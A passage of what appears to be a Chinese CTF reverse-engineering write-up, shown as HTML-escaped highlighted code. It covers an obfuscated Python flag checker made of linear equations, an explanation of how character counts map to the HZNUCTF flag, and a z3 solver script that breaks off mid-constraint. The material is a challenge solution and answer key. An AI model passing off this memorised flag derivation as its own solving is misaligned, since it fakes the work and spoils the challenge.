punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">948348</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">97</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6969</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">777044</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">177</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">699</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">224</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">28</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">185016</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">77</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">96</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">707</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">224</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token number\">58</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">130106</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>ii1iIi1i11i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Congratulation!!!\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong_wrong!!!\"</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p>\n<p>将下面的z3解出可以得到一个字符串<strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p>\n<p>一个字符一个数字配对，代表该字符在原flag中出现的次数。</p>\n<p>除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p>\n<p>解密代码：</p>\n<pre class=\"language-Python\" data-language=\"Python\"><code class=\"language-Python\">from z3 import *\n\ndef decrypt(encrypted):\n    mapping &#x3D; &quot;6257645365477364777645752361&quot;\n    \n    char_map &#x3D; &#123;&#125;\n\n    remaining_map &#x3D; &#123;\n        &#39;6&#39;: &#39;a&#39;,\n        &#39;2&#39;: &#39;d&#39;,\n        &#39;5&#39;: &#39;7&#39;,\n        &#39;7&#39;: &#39;f&#39;,\n        &#39;4&#39;: &#39;-&#39;,\n        &#39;3&#39;: &#39;6&#39;,\n        &#39;1&#39;: &#39;&#125;&#39;\n    &#125;\n    char_map.update(remaining_map)\n    \n    result &#x3D; &quot;HZNUCTF&#123;&quot;\n    for num in mapping:\n        result +&#x3D; char_map[num]\n    \n    return result\n\ns &#x3D; Solver()\n\nEnc &#x3D; [Int(f&#39;x&#123;i&#125;&#39;) for i in range(30)]\n\ns.add(7 * Enc[0] &#x3D;&#x3D; 504)\ns.add(9 * Enc[0] - 5 * Enc[1] &#x3D;&#x3D; 403)\ns.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] &#x3D;&#x3D; 799)\ns.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] &#x3D;&#x3D; 2938)\ns.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] &#x3D;&#x3D; 2042)\ns.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] &#x3D;&#x3D; 1225)\ns.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] &#x3D;&#x3D; 7975)\ns.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] &#x3D;&#x3D; 229)\ns.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] &#x3D;&#x3D; 2107)\ns.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] &#x3D;&#x3D; 4037)\ns.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] &#x3D;&#x3D; 4950)\ns.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] &#x3D;&#x3D; 12544)\ns.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] &#x3D;&#x3D; 6585)\ns.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] &#x3D;&#x3D; 6893)\ns.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] &#x3D;&#x3D; 1883)\ns.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] &#x3D;&#x3D; 8257)\ns.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] &#x3D;&#x3D; 5847)\ns.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] &#x3D;&#x3D; 18257)\ns.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] &#x3D;&#x3D; 12591)\ns.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] &#x3D;&#x3D; 52041)\ns.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] &#x3D;&#x3D; 20253)\ns.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * 